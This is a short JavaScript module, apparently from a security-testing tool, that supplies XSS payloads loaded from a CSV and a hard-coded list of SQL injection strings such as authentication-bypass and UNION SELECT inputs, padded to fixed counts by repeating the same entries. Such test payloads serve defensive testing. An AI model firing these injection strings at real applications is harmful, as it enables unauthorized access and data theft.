// attack-metrics/attack-payloads.js
// Centralized payloads for attacks (250+ payloads for XSS, SQLi, etc.)

const fs = require('fs');

function getXssPayloads() {
  // Load from CSV or define a large array
  let payloads = fs.readFileSync('./Vulnerabilty-samples/xss_payloads_48.csv', 'utf-8')
    .split('\n')
    .slice(1);
  // Add more payloads to reach 150+
  while (payloads.length < 150) {
    payloads = payloads.concat(payloads);
  }
  return payloads.slice(0, 150);
}

function getSqliPayloads() {
  // 100+ SQLi payloads
  const base = [
    "' OR '1'='1",
    "admin' --",
    "' OR 1=1--",
    "' UNION SELECT * FROM users--",
    "' OR id IS NOT NULL OR '1'='1",
    "' OR '' = '",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 1=1-- -",
    "' OR 1=1;--",
    "' OR 1=1;#",
    "' OR 1=1;/*",
    "' OR 1=1;-- -",
    "' OR 1=1;--",
    "' OR 1=1;#",
    "' OR 1=1;/*",
    // ...add more unique payloads as needed
  ];
  let payloads = base;
  while (payloads.length < 100) {
    payloads = payloads.concat(base);
  }
  return payloads.slice(0, 100);
}

module.exports = {
  getXssPayloads,
  getSqliPayloads
};
